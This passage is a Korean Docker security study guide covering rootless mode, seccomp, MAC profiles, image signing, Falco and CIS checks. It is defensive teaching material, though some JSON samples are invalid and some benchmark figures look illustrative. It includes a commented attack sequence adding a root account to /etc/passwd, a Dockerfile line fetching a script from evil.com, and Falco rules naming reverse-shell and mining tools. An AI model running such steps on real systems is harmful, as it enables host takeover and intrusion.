# Ch10. Docker Security - 심화 탐구

> LEARN.md를 학습한 뒤, 더 깊이 파고들어야 할 질문들

---

## Q1. Rootless Docker는 무엇이며, 왜 중요한가?

### 왜 이 질문이 중요한가
기본 Docker는 root 권한이 필요하다. 컨테이너 내부의 root는 호스트의 root와 동일한 UID 0이므로, 컨테이너 탈출 시 호스트를 완전히 장악할 수 있다. Rootless Docker는 이 위험을 근본적으로 제거한다.

### 답변
**전통적 Docker의 보안 모델**:

```
┌─────────────────────────────────────────────────────────┐
│              전통적 Docker (Root 필요)                    │
└─────────────────────────────────────────────────────────┘

  Host                     Docker Daemon        Container
  ┌──────────────┐        ┌──────────────┐    ┌──────────┐
  │ root (UID 0) │───────►│ dockerd      │───►│ root (0) │
  │              │  socket│ (UID 0 실행) │    │          │
  └──────────────┘        └──────────────┘    └──────────┘
                                │
                                ├─ 특권 작업 가능:
                                │  • 네트워크 설정
                                │  • 마운트/언마운트
                                │  • Cgroups 조작
                                │  • iptables 수정
                                └─ 컨테이너 탈출 시 호스트 완전 장악
```

**Rootless Docker의 보안 모델**:

```
┌─────────────────────────────────────────────────────────┐
│                 Rootless Docker                          │
└─────────────────────────────────────────────────────────┘

  Host                     Docker Daemon        Container
  ┌──────────────┐        ┌──────────────┐    ┌──────────┐
  │ user (UID    │───────►│ dockerd      │───►│ root (0) │
  │  1000)       │        │ (UID 1000)   │    │ → 1000   │
  └──────────────┘        └──────────────┘    └────┬─────┘
                                │                  │
                                │                  │ User Namespace
                                │                  │ Remapping
                                ▼                  ▼
                    ┌────────────────────────────────────┐
                    │ 컨테이너 내 root = 호스트의 일반 사용자 │
                    │ 탈출해도 호스트에 root 권한 없음!    │
                    └────────────────────────────────────┘
```

**설치 및 설정**:

```bash
# Rootless Docker 설치
curl -fsSL https://get.docker.com/rootless | sh

# 환경변수 설정
export PATH=/home/user/bin:$PATH
export DOCKER_HOST=unix:///run/user/1000/docker.sock

# 시스템 서비스 등록
systemctl --user enable docker
systemctl --user start docker

# 확인
docker run hello-world
```

**UID/GID 매핑**:

```bash
# /etc/subuid (사용자별 UID 범위 할당)
user:100000:65536
# user가 100000~165535 범위 사용 가능

# /etc/subgid (그룹 ID 범위)
user:100000:65536

# 컨테이너 내부 UID → 호스트 UID 매핑
Container UID 0 (root)  → Host UID 100000
Container UID 1         → Host UID 100001
Container UID 1000      → Host UID 101000
```

**제약사항**:

**1. 포트 제한**:
```bash
# 1024 이하 포트 바인딩 불가 (특권 포트)
docker run -p 80:80 nginx  # 실패!

# 해결책 1: 높은 포트 사용
docker run -p 8080:80 nginx  # 성공

# 해결책 2: sysctl 설정 (시스템 전체 적용)
sysctl -w net.ipv4.ip_unprivileged_port_start=80
```

**2. Cgroups v2 필요**:
```bash
# Cgroups v1은 제한적 지원
# Ubuntu 22.04+, Fedora 31+ 권장

# Cgroups 버전 확인
stat -fc %T /sys/fs/cgroup/
# cgroup2fs → v2 (권장)
# tmpfs → v1 (제한적)
```

**3. Overlay 네트워크 미지원**:
```bash
# Swarm overlay 네트워크 불가
# 해결: slirp4netns 또는 VPNKit 사용
```

**4. AppArmor/SELinux 프로파일 제한**:
```bash
# 일부 보안 프로파일이 작동 안 할 수 있음
```

**보안 이점**:

**컨테이너 탈출 시나리오**:
```bash
# 전통적 Docker (취약)
# 1. 컨테이너에서 커널 취약점 공격
# 2. 호스트 root 권한 획득
# 3. /etc/passwd 수정, 백도어 설치 → 게임 오버

# Rootless Docker (안전)
# 1. 컨테이너에서 커널 취약점 공격
# 2. 호스트 UID 100000 권한 획득 (일반 사용자)
# 3. 호스트에 아무것도 못 함 (root 권한 없음)
```

**성능 영향**:
```
┌─────────────────────────────────────────────────────────┐
│           Rootless vs Rootful 성능 비교                  │
└─────────────────────────────────────────────────────────┘

네트워크:
  Rootful (bridge):  9.5 Gbps
  Rootless (slirp4netns): 1.2 Gbps  (-87%)
  Rootless (pasta):  7.8 Gbps  (-18%)  ← 권장

파일시스템:
  Rootful: 3000 MB/s
  Rootless (fuse-overlayfs): 2400 MB/s  (-20%)
  Rootless (native overlay): 2900 MB/s  (-3%)

결론: 네트워크는 pasta 사용, 파일시스템은 큰 차이 없음
```

### 실무 적용
개발 워크스테이션이나 공유 서버에서는 Rootless Docker를 권장한다. 프로덕션 클러스터(Kubernetes)에서는 Pod Security Standards로 유사한 보안을 달성할 수 있다. CI/CD 환경에서 Rootless Docker를 사용하면 빌드 서버의 보안 위험을 크게 줄인다.

---

## Q2. Seccomp 프로파일은 어떻게 작성하며, 어떤 syscall을 차단해야 하는가?

### 왜 이 질문이 중요한가
Docker의 기본 seccomp 프로파일은 범용적이라 일부 공격 벡터를 허용할 수 있다. 애플리케이션별 커스텀 프로파일을 작성하면 공격 표면을 최소화할 수 있다.

### 답변
**Seccomp란?**

```
┌─────────────────────────────────────────────────────────┐
│              Seccomp 필터링 흐름                          │
└─────────────────────────────────────────────────────────┘

  Container Process
  ┌─────────────────┐
  │   Application   │
  │       │         │
  │       ▼         │
  │   syscall()     │  예: open("/etc/passwd", O_RDWR)
  └───────┬─────────┘
          │
          ▼
  ┌─────────────────┐
  │ Seccomp Filter  │
  │ (BPF Program)   │
  └───────┬─────────┘
          │
      ┌───┴───┐
      ▼       ▼
  Allowed   Blocked
      │       │
      ▼       └──► EPERM (Operation not permitted)
  ┌─────────┐      또는 SIGKILL (프로세스 종료)
  │ Kernel  │
  │ Syscall │
  └─────────┘
```

**Docker 기본 프로파일 분석**:

```bash
# 기본 프로파일 확인
docker run --rm -it alpine cat /proc/self/status | grep Seccomp
Seccomp:    2  # 2 = 필터링 모드, 0 = 비활성화

# 차단된 syscall 예시 (기본 프로파일)
- clone (CLONE_NEWUSER) # 사용자 네임스페이스 생성 차단
- keyctl                 # 키 관리 (컨테이너 탈출에 악용 가능)
- add_key, request_key
- bpf                    # eBPF 프로그램 로드 차단
- perf_event_open        # 성능 카운터 접근 차단
- unshare                # 네임스페이스 분리 차단
- mount, umount2         # 마운트 작업 차단
- reboot, swapon/off     # 시스템 관리 차단
- kexec_load             # 커널 교체 차단
```

**커스텀 프로파일 작성**:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_AARCH64"
  ],
  "syscalls": [
    {
      "names": [
        "read",
        "write",
        "open",
        "close",
        "stat",
        "fstat",
        "lstat",
        "poll",
        "lseek",
        "mmap",
        "mprotect",
        "munmap",
        "brk",
        "rt_sigaction",
        "rt_sigprocmask",
        "rt_sigreturn",
        "ioctl",
        "access",
        "pipe",
        "select",
        "socket",
        "connect",
        "accept",
        "sendto",
        "recvfrom",
        "bind",
        "listen",
        "getsockname",
        "getpeername",
        "setsockopt",
        "getsockopt",
        "clone",
        "fork",
        "vfork",
        "execve",
        "exit",
        "wait4",
        "kill",
        "uname",
        "getpid",
        "getuid",
        "getgid"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": [
        "chmod",
        "chown",
        "setuid",
        "setgid"
      ],
      "action": "SCMP_ACT_ERRNO",
      "comment": "보안: 권한 변경 차단"
    }
  ]
}
```

**프로파일 적용**:

```bash
# 커스텀 프로파일로 컨테이너 실행
docker run --rm -it \
  --security-opt seccomp=/path/to/custom-profile.json \
  alpine sh

# Seccomp 완전 비활성화 (테스트용, 프로덕션 금지)
docker run --rm -it \
  --security-opt seccomp=unconfined \
  alpine sh
```

**애플리케이션별 프로파일 전략**:

**웹 서버 (Nginx)**:
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": [
        "accept4", "bind", "listen", "socket",  # 네트워크
        "read", "write", "sendfile",            # I/O
        "open", "openat", "close", "stat",      # 파일
        "epoll_create", "epoll_wait"            # 이벤트 루프
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**데이터베이스 (PostgreSQL)**:
```json
{
  "syscalls": [
    {
      "names": [
        "fsync", "fdatasync",  # 트랜잭션 내구성
        "flock", "fcntl",      # 파일 락
        "mmap", "munmap",      # 공유 메모리
        "shmget", "shmat"      # IPC
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**빌드 도구 (컴파일러)**:
```json
{
  "syscalls": [
    {
      "names": [
        "clone",               # 프로세스 포크
        "execve",              # 실행
        "wait4", "waitid"      # 대기
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**프로파일 생성 도구**:

**1. strace로 필요한 syscall 분석**:
```bash
# 애플리케이션이 사용하는 syscall 추적
strace -c -f -o trace.log docker run --rm myapp

# 빈도 높은 syscall 추출
cat trace.log | awk '{print $6}' | sort | uniq -c | sort -rn
```

**2. seccomp-profiler**:
```bash
# 자동으로 프로파일 생성
docker run --security-opt seccomp=unconfined \
  --cap-add SYS_PTRACE \
  myapp

# 실행 중 syscall 기록
# → 최소 권한 프로파일 생성
```

**디버깅**:

```bash
# Seccomp 위반 확인 (dmesg)
dmesg | grep audit
audit: type=1326 audit(1234567890.123:456):
  auid=1000 uid=1000 gid=1000 ses=1
  pid=12345 comm="app"
  exe="/usr/bin/app"
  sig=31 arch=c000003e
  syscall=165 compat=0
  ip=0x7f... code=0x7ffc...

# syscall 165 = mount (차단됨)
```

### 실무 적용
프로덕션에서는 기본 프로파일로 시작하여 점진적으로 강화한다. 먼저 strace로 필요한 syscall을 식별하고, 불필요한 것을 차단한다. 특히 `mount`, `unshare`, `bpf` 같은 위험한 syscall은 반드시 차단한다. Kubernetes에서는 Pod Security Policy나 SecurityContext로 seccomp 프로파일을 강제할 수 있다.

---

## Q3. AppArmor와 SELinux의 차이점은 무엇이며, 어떻게 선택하는가?

### 왜 이 질문이 중요한가
AppArmor와 SELinux는 모두 Mandatory Access Control(MAC)을 제공하지만, 철학과 사용 방법이 다르다. 잘못 선택하면 설정이 복잡하거나 효과가 없을 수 있다.

### 답변
**AppArmor vs SELinux 비교**:

| 특성 | AppArmor | SELinux |
|------|----------|---------|
| **철학** | 경로 기반 (Path-based) | 레이블 기반 (Label-based) |
| **복잡도** | 낮음 (이해하기 쉬움) | 높음 (학습 곡선 가파름) |
| **정책 작성** | 사람이 읽기 쉬운 텍스트 | Context 기반 규칙 |
| **배포판 지원** | Debian, Ubuntu, SUSE | RHEL, CentOS, Fedora |
| **Docker 통합** | 간단 | 복잡 |
| **세밀함** | 중간 | 매우 세밀 |
| **성능 영향** | 낮음 | 약간 높음 |

**AppArmor 프로파일 예시**:

```bash
# /etc/apparmor.d/docker-nginx
#include <tunables/global>

profile docker-nginx flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # 네트워크 허용
  network inet tcp,
  network inet udp,

  # 파일 접근 제어
  /usr/sbin/nginx mr,
  /etc/nginx/** r,
  /var/log/nginx/** w,
  /var/www/html/** r,

  # 실행 금지
  deny /bin/** x,
  deny /usr/bin/** x,

  # 민감한 파일 접근 차단
  deny /etc/shadow r,
  deny /etc/passwd w,

  # 프로세스 권한
  capability net_bind_service,
  capability setuid,
  capability setgid,

  # 나머지 모두 차단
  deny /** w,
}
```

**프로파일 로드 및 적용**:

```bash
# 프로파일 로드
sudo apparmor_parser -r /etc/apparmor.d/docker-nginx

# 컨테이너에 프로파일 적용
docker run -d \
  --security-opt apparmor=docker-nginx \
  nginx

# 프로파일 상태 확인
docker exec <container> cat /proc/self/attr/current
docker-nginx (enforce)
```

**SELinux 컨텍스트 예시**:

```bash
# SELinux 컨텍스트 확인
ls -Z /var/lib/docker
system_u:object_r:container_file_t:s0 /var/lib/docker

# 컨테이너 프로세스 컨텍스트
ps -eZ | grep docker
system_u:system_r:container_t:s0:c123,c456 12345 ? 00:00:01 nginx

# 파일에 레이블 할당
chcon -t container_file_t /path/to/volume
```

**SELinux 정책 작성 (복잡)**:

```bash
# 컨테이너가 /custom 디렉토리 접근 허용
semanage fcontext -a -t container_file_t "/custom(/.*)?"
restorecon -R /custom

# 커스텀 정책 모듈 작성
cat > docker_custom.te <<EOF
module docker_custom 1.0;

require {
    type container_t;
    type custom_file_t;
    class file { read write };
}

allow container_t custom_file_t:file { read write };
EOF

# 정책 컴파일 및 로드
checkmodule -M -m -o docker_custom.mod docker_custom.te
semodule_package -o docker_custom.pp -m docker_custom.mod
semodule -i docker_custom.pp
```

**Docker에서의 사용**:

**AppArmor (Debian/Ubuntu)**:
```yaml
# docker-compose.yaml
services:
  web:
    security_opt:
      - apparmor:docker-nginx
```

**SELinux (RHEL/CentOS)**:
```yaml
services:
  web:
    security_opt:
      - label:type:container_t
      - label:level:s0:c100,c200
```

**선택 기준**:

**AppArmor를 선택하는 경우**:
- Ubuntu/Debian 환경
- 간단한 정책 (파일 경로 기반)
- 빠른 프로토타이핑
- 팀이 보안 전문가가 아님

**SELinux를 선택하는 경우**:
- RHEL/CentOS 환경 (기본 활성화)
- 매우 세밀한 정책 필요
- 규정 준수 요구사항 (정부, 금융)
- 전문 보안 팀 보유

**성능 영향**:

```
┌─────────────────────────────────────────────────────────┐
│           MAC 성능 오버헤드 (벤치마크)                    │
└─────────────────────────────────────────────────────────┘

파일 I/O:
  No MAC:     3000 MB/s
  AppArmor:   2950 MB/s  (-1.7%)
  SELinux:    2900 MB/s  (-3.3%)

시스템 콜:
  No MAC:     100k/s
  AppArmor:   99k/s     (-1%)
  SELinux:    97k/s     (-3%)

결론: 성능 차이는 미미함, 보안 이점이 훨씬 큼
```

**디버깅**:

**AppArmor**:
```bash
# 위반 로그 확인
sudo dmesg | grep apparmor
audit: type=1400 audit(123:456):
  apparmor="DENIED" operation="open"
  profile="docker-nginx"
  name="/etc/shadow"
  requested_mask="r"

# Complain 모드로 테스트 (차단 대신 경고)
sudo aa-complain docker-nginx
```

**SELinux**:
```bash
# 위반 로그 확인
sudo ausearch -m avc -ts recent

# Permissive 모드로 테스트
setenforce 0  # 전체 시스템
# 또는 컨테이너별
docker run --security-opt label:disable ...
```

### 실무 적용
배포판 기본값을 사용한다 (Ubuntu → AppArmor, RHEL → SELinux). Docker는 자동으로 기본 프로파일을 적용하므로 대부분의 경우 추가 설정이 불필요하다. 커스텀 프로파일은 특별한 보안 요구사항이 있을 때만 작성한다. Kubernetes에서는 Pod Security Standards가 MAC를 대체하는 경우가 많다.

---

## Q4. Docker Content Trust(DCT)의 키 관리는 어떻게 이루어지며, 키 유출 시 대응은?

### 왜 이 질문이 중요한가
DCT는 이미지 무결성을 보장하지만, 서명 키가 유출되면 공격자가 악성 이미지에 서명할 수 있다. 키 라이프사이클 관리와 유출 대응 전략이 필수적이다.

### 답변
**DCT 키 계층 구조**:

```
┌─────────────────────────────────────────────────────────┐
│              DCT 키 계층 (Notary)                        │
└─────────────────────────────────────────────────────────┘

  Root Key (최상위, 오프라인 보관)
    │
    ├─ Targets Key (이미지 서명)
    │    └─ 이미지별로 분리 가능
    │
    ├─ Snapshot Key (메타데이터 서명)
    │
    └─ Timestamp Key (타임스탬프 서명, 자동 로테이션)

역할:
  Root: 다른 키 위임, 거의 사용 안 함 (안전하게 보관)
  Targets: 실제 이미지 서명, 자주 사용
  Snapshot: 메타데이터 일관성 보장
  Timestamp: 신선도 보장, 48시간마다 자동 갱신
```

**키 생성 및 저장 위치**:

```bash
# 처음 DCT 활성화 시 키 생성
export DOCKER_CONTENT_TRUST=1
docker push myregistry.io/myapp:v1

# 키 저장 위치
~/.docker/trust/
├── private/
│   ├── root_keys/
│   │   └── <repo-hash>.key          # Root Key (패스프레이즈 암호화)
│   ├── tuf_keys/
│   │   └── <repo>/
│   │       ├── targets.key          # Targets Key
│   │       ├── snapshot.key         # Snapshot Key
│   │       └── timestamp.key        # Timestamp Key
└── trusted/
    └── <registry>/
        └── <repo>/
            └── metadata/
```

**키 백업**:

```bash
# Root Key 백업 (매우 중요!)
tar czf docker-trust-backup-$(date +%Y%m%d).tar.gz \
  ~/.docker/trust/private/root_keys/

# 오프라인 저장소로 이동 (USB, 금고 등)
mv docker-trust-backup-*.tar.gz /secure/offline/storage/

# 복원
tar xzf docker-trust-backup-20240523.tar.gz -C ~/
```

**하드웨어 보안 모듈 (HSM) 통합**:

```bash
# YubiKey를 Root Key 저장소로 사용
docker trust key generate my-root-key --yubikey

# HSM에서 서명
export DOCKER_CONTENT_TRUST_ROOT_PASSPHRASE=""  # HSM PIN
docker push myregistry.io/myapp:v1
# → YubiKey에서 서명 수행
```

**키 로테이션**:

```bash
# Targets Key 로테이션
docker trust key rotate <registry>/<repo>

# 새 키 생성 + 기존 서명 유지
# 이전 키로 서명된 이미지는 여전히 검증 가능
```

**키 유출 시나리오 및 대응**:

**시나리오 1: Targets Key 유출**:
```bash
# 1. 즉시 키 로테이션
docker trust key rotate myregistry.io/myapp

# 2. 의심스러운 이미지 삭제
docker trust revoke myregistry.io/myapp:suspicious-tag

# 3. 모든 이미지 재서명
for tag in v1.0 v1.1 v1.2; do
  docker pull myregistry.io/myapp:$tag
  docker tag myregistry.io/myapp:$tag temp:$tag
  docker push temp:$tag  # 새 키로 서명
done
```

**시나리오 2: Root Key 유출 (심각)**:
```bash
# 1. 레포지토리 재초기화 (모든 서명 무효화)
rm -rf ~/.docker/trust/private/root_keys/<repo-hash>.key
docker trust signer remove --force <signer> <repo>

# 2. 새 Root Key로 재시작
docker trust key generate new-root
docker push myregistry.io/myapp:latest  # 새 Root로 서명

# 3. 클라이언트에게 새 Root Key 신뢰 요청
# (사용자가 수동으로 trust 데이터 삭제 필요)
```

**키 유출 탐지**:

```bash
# 의심스러운 서명 확인
docker trust inspect --pretty myregistry.io/myapp:latest

SIGNED TAG          DIGEST                                                             SIGNERS
latest              sha256:abc123...                                                   alice, bob

# alice와 bob이 합법적인 signer인지 확인
# 알 수 없는 signer 발견 → 키 유출 가능성
```

**베스트 프랙티스**:

**1. Root Key 보호**:
```bash
# Root Key는 오프라인 저장
# HSM이나 YubiKey 사용
# 패스프레이즈 강력하게 설정
# 백업을 물리적으로 분리된 곳에 보관
```

**2. 최소 권한 원칙**:
```bash
# CI/CD에서는 Targets Key만 사용
# Root Key는 보안팀만 접근
docker trust signer add --key targets.pub ci-user myregistry.io/myapp
```

**3. 키 로테이션 정기화**:
```bash
# 매 분기 Targets Key 로테이션
# Cron 작업으로 자동화
0 0 1 1,4,7,10 * /usr/local/bin/rotate-docker-keys.sh
```

**4. 감사 로그**:
```bash
# Notary 서버 감사 로그 활성화
# 누가 언제 무엇을 서명했는지 추적
docker trust inspect --pretty myregistry.io/myapp | tee audit.log
```

**CI/CD 통합**:

```yaml
# GitLab CI 예시
.docker_trust_setup: &docker_trust_setup
  - export DOCKER_CONTENT_TRUST=1
  - export DOCKER_CONTENT_TRUST_SERVER=https://notary.example.com
  - echo "$TARGETS_KEY" | docker trust key load -

build_and_push:
  script:
    - *docker_trust_setup
    - docker build -t myregistry.io/myapp:$CI_COMMIT_SHA .
    - docker push myregistry.io/myapp:$CI_COMMIT_SHA
  only:
    - main
```

**제약사항**:
- DCT는 Registry v2 API 필요
- Docker Hub, Harbor 등 일부 레지스트리만 지원
- 이미지당 서명 생성으로 빌드 시간 증가 (~5-10초)
- 키 관리 복잡도 증가

### 실무 적용
프로덕션 환경에서는 DCT를 활성화하고 CI/CD 파이프라인에서 자동 서명을 구성한다. Root Key는 HSM에 저장하고, Targets Key만 CI/CD에 제공한다. 키 유출에 대비하여 정기적인 로테이션과 감사 로그를 유지한다. Kubernetes에서는 Admission Controller로 서명된 이미지만 허용하도록 정책을 강제한다.

---

## Q5. 런타임 보안 모니터링 (Falco)은 어떻게 동작하며, 어떤 위협을 탐지하는가?

### 왜 이 질문이 중요한가
DCT, seccomp, AppArmor는 예방적 보안이다. 하지만 Zero-day 취약점이나 내부자 공격은 탐지가 필요하다. Falco는 런타임에 의심스러운 행동을 실시간으로 감지한다.

### 답변
**Falco 아키텍처**:

```
┌─────────────────────────────────────────────────────────┐
│                   Falco 동작 원리                        │
└─────────────────────────────────────────────────────────┘

  Container Processes
  ┌─────────────────┐
  │   nginx, db,    │
  │   app, ...      │
  └────────┬────────┘
           │ syscalls
           ▼
  ┌─────────────────────────────────────────────────────┐
  │              Linux Kernel                            │
  │  ┌──────────────────────────────────────────────┐   │
  │  │        Falco Kernel Module                   │   │
  │  │        또는 eBPF Probe                       │   │
  │  └────────────────────┬─────────────────────────┘   │
  └───────────────────────┼─────────────────────────────┘
                          │ 이벤트 스트림
                          ▼
  ┌─────────────────────────────────────────────────────┐
  │              Falco Userspace                         │
  │  ┌──────────────────────────────────────────────┐   │
  │  │          Rules Engine                        │   │
  │  │  • 의심스러운 syscall 패턴 매칭              │   │
  │  │  • 컨테이너 메타데이터 enrichment            │   │
  │  └────────────────────┬─────────────────────────┘   │
  └───────────────────────┼─────────────────────────────┘
                          │ 알림
           ┌──────────────┼──────────────┐
           ▼              ▼              ▼
    ┌──────────┐   ┌──────────┐   ┌──────────┐
    │  Stdout  │   │  Syslog  │   │  Webhook │
    │  (로그)  │   │          │   │ (Slack)  │
    └──────────┘   └──────────┘   └──────────┘
```

**Falco 규칙 예시**:

```yaml
# /etc/falco/falco_rules.yaml

# 규칙 1: 쉘이 컨테이너에서 실행됨
- rule: Terminal shell in container
  desc: A shell was used as the entrypoint/exec point
  condition: >
    container and
    proc.name in (bash, sh, zsh, csh, ksh) and
    proc.pname exists and
    not proc.pname in (bash, sh, zsh, csh, ksh)
  output: >
    Shell spawned in container
    (user=%user.name container_id=%container.id container_name=%container.name
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
  priority: WARNING

# 규칙 2: 컨테이너에서 /etc/passwd 수정
- rule: Modify passwd file
  desc: Detect attempts to modify /etc/passwd
  condition: >
    open_write and
    container and
    fd.name = /etc/passwd
  output: >
    /etc/passwd modified in container
    (user=%user.name container=%container.name
    file=%fd.name proc=%proc.cmdline)
  priority: ERROR

# 규칙 3: 패키지 관리자 실행 (의심스러운 행동)
- rule: Package manager in container
  desc: Package manager executed in container
  condition: >
    spawned_process and
    container and
    proc.name in (apt, apt-get, yum, dnf, apk)
  output: >
    Package manager run in container
    (user=%user.name container=%container.name
    command=%proc.cmdline)
  priority: NOTICE

# 규칙 4: 특권 컨테이너에서 민감한 마운트
- rule: Sensitive mount in privileged container
  desc: Detect mount of sensitive paths in privileged container
  condition: >
    evt.type = mount and
    container and
    container.privileged = true and
    (fd.name startswith /proc or
     fd.name startswith /sys or
     fd.name startswith /dev)
  output: >
    Sensitive path mounted in privileged container
    (container=%container.name path=%fd.name)
  priority: CRITICAL
```

**탐지 가능한 위협**:

**1. 컨테이너 탈출 시도**:
```yaml
- rule: Container escape attempt
  condition: >
    spawned_process and
    container and
    (proc.name in (nsenter, unshare) or
     proc.cmdline contains "/proc/self/ns")
  priority: CRITICAL
```

**2. 암호화폐 채굴**:
```yaml
- rule: Crypto mining
  condition: >
    spawned_process and
    container and
    (proc.name in (xmrig, minerd, cpuminer) or
     proc.cmdline contains "stratum+tcp://")
  priority: CRITICAL
```

**3. 역방향 쉘**:
```yaml
- rule: Reverse shell
  condition: >
    spawned_process and
    container and
    proc.name in (nc, ncat, socat, netcat) and
    (proc.cmdline contains "-e" or
     proc.cmdline contains "-c")
  priority: CRITICAL
```

**4. 컨테이너에서 SSH 서버 실행**:
```yaml
- rule: SSH server in container
  condition: >
    spawned_process and
    container and
    proc.name = sshd
  priority: WARNING
```

**Falco 설치 및 설정**:

```bash
# Falco 설치 (Kubernetes DaemonSet)
kubectl apply -f https://raw.githubusercontent.com/falcosecurity/charts/master/falco/templates/daemonset.yaml

# 또는 Docker 컨테이너로
docker run -d \
  --name falco \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /etc/falco:/etc/falco \
  falcosecurity/falco:latest
```

**알림 통합**:

**Slack 웹훅**:
```yaml
# /etc/falco/falco.yaml
json_output: true
json_include_output_property: true
http_output:
  enabled: true
  url: "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXX"
```

**Sidekick (알림 라우팅)**:
```bash
# Falcosidekick 실행
docker run -d \
  -e SLACK_WEBHOOKURL="https://hooks.slack.com/..." \
  -e SLACK_MINIMUMPRIORITY=warning \
  -e ELASTICSEARCH_HOSTPORT="http://es:9200" \
  falcosecurity/falcosidekick:latest
```

**실전 사용 예시**:

**공격 시나리오 탐지**:
```bash
# 1. 공격자가 컨테이너에 침투
kubectl exec -it vulnerable-pod -- /bin/bash

# Falco 알림:
# "Terminal shell in container (container=vulnerable-pod)"

# 2. 권한 상승 시도
# echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd

# Falco 알림:
# "CRITICAL: /etc/passwd modified in container"

# 3. 네트워크 스캔
# nmap -sS 10.0.0.0/24

# Falco 알림:
# "WARNING: Suspicious network tool in container (proc=nmap)"
```

**커스텀 규칙 작성**:

```yaml
# 회사 정책: 컨테이너에서 curl 사용 금지
- rule: Disallow curl in production
  desc: curl is not allowed in production containers
  condition: >
    spawned_process and
    container and
    container.image.repository != "ubuntu" and
    proc.name = curl
  output: >
    curl executed in container
    (container=%container.name image=%container.image.repository
    user=%user.name command=%proc.cmdline)
  priority: ERROR
  tags: [company_policy, network]
```

**성능 영향**:

```
┌─────────────────────────────────────────────────────────┐
│           Falco 오버헤드 (벤치마크)                      │
└─────────────────────────────────────────────────────────┘

CPU:
  No Falco:        5%
  Falco (Kernel):  6%  (+1%)
  Falco (eBPF):    5.5% (+0.5%)

메모리:
  Falco Daemon:    ~200 MB

I/O:
  로그 쓰기:       ~1 MB/분 (경고 적을 때)

결론: 매우 낮은 오버헤드, 프로덕션 사용 가능
```

### 실무 적용
프로덕션 Kubernetes 클러스터에는 Falco를 DaemonSet으로 배포하여 모든 노드를 모니터링한다. Slack이나 PagerDuty로 알림을 전송하고, CRITICAL 우선순위는 즉시 대응, WARNING은 일일 리뷰한다. 규칙은 회사 보안 정책에 맞게 커스터마이징하고, 정기적으로 튜닝하여 False Positive를 줄인다.

---

## Q6. CIS Docker Benchmark는 무엇이며, 주요 권장사항은?

### 왜 이 질문이 중요한가
CIS (Center for Internet Security) Benchmark는 Docker 보안 설정의 업계 표준이다. 규정 준수(Compliance)가 필요한 조직에서는 CIS Benchmark 준수가 필수적이다.

### 답변
**CIS Docker Benchmark 개요**:

7개 섹션, 100+ 개의 권장사항:
1. Host Configuration
2. Docker Daemon Configuration
3. Docker Daemon Configuration Files
4. Container Images and Build Files
5. Container Runtime
6. Docker Security Operations
7. Docker Swarm Configuration

**주요 권장사항 (High Priority)**:

**1. 호스트 설정**:
```bash
# 1.1.1 별도 파티션에 /var/lib/docker 마운트
lsblk
# /dev/sdb1 → /var/lib/docker (독립 파티션)

# 이유: 디스크 가득 참 공격 방지, 성능 격리

# 1.2.1 Docker 데몬을 비root 사용자로 실행 (Rootless)
# (앞서 Q1 참조)
```

**2. Docker 데몬 설정**:
```json
// /etc/docker/daemon.json
{
  // 2.1 네트워크 트래픽을 localhost로 제한
  "hosts": ["unix:///var/run/docker.sock"],  // TCP 노출 금지

  // 2.8 라이브 복원 활성화
  "live-restore": true,

  // 2.11 userland proxy 비활성화
  "userland-proxy": false,

  // 2.13 ulimits 설정
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 64000,
      "Soft": 64000
    }
  },

  // 2.14 기본 cgroup parent 설정
  "cgroup-parent": "/docker",

  // 2.15 권한 있는 컨테이너 기본 차단 (코드 레벨에서 제어)

  // 2.18 실험적 기능 비활성화
  "experimental": false
}
```

**3. 컨테이너 이미지**:
```dockerfile
# 4.1 신뢰할 수 있는 Base 이미지만 사용
FROM ubuntu:22.04  # Official Image
# FROM random/ubuntu ❌

# 4.2 USER 지시자로 비root 사용자 설정
RUN useradd -m appuser
USER appuser

# 4.5 COPY 대신 ADD 사용 금지 (보안 위험)
COPY app.js /app/  ✅
# ADD https://evil.com/malware.sh /app/ ❌

# 4.7 HEALTHCHECK 정의
HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://localhost/ || exit 1

# 4.9 .dockerignore 사용
# .git, .env, *.key 등 제외
```

**4. 컨테이너 런타임**:
```bash
# 5.1 AppArmor 프로파일 적용
docker run --security-opt apparmor=docker-default nginx

# 5.2 SELinux 활성화
docker run --security-opt label=type:container_t nginx

# 5.3 Linux Kernel Capabilities 최소화
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE nginx

# 5.4 특권 컨테이너 금지
# docker run --privileged ❌

# 5.7 특권 포트 매핑 제한
docker run -p 8080:80 nginx  ✅
# docker run -p 80:80 nginx ❌ (1024 이하 포트)

# 5.10 메모리 제한 설정
docker run -m 512m nginx

# 5.11 CPU 우선순위 설정
docker run --cpu-shares=512 nginx

# 5.12 컨테이너 루트 파일시스템을 read-only로
docker run --read-only --tmpfs /tmp nginx

# 5.15 호스트 네트워크 모드 금지
# docker run --network=host ❌

# 5.25 컨테이너 재시작 정책
docker run --restart=on-failure:5 nginx

# 5.28 PIDs cgroup 제한
docker run --pids-limit=100 nginx
```

**5. Docker 보안 운영**:
```bash
# 6.1 컨테이너 이미지 정기 감사
docker scan nginx:latest

# 6.2 취약점 있는 컨테이너 즉시 제거

# 6.4 Docker 관련 파일에 대한 감사 활성화
auditctl -w /usr/bin/docker -k docker
auditctl -w /var/lib/docker -k docker
auditctl -w /etc/docker -k docker

# 6.5 Docker 데몬 로그 레벨 설정
# /etc/docker/daemon.json
{
  "log-level": "info"  # debug는 프로덕션 금지
}
```

**자동 검사 도구**:

**Docker Bench Security**:
```bash
# CIS Benchmark 자동 검사
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /var/lib:/var/lib \
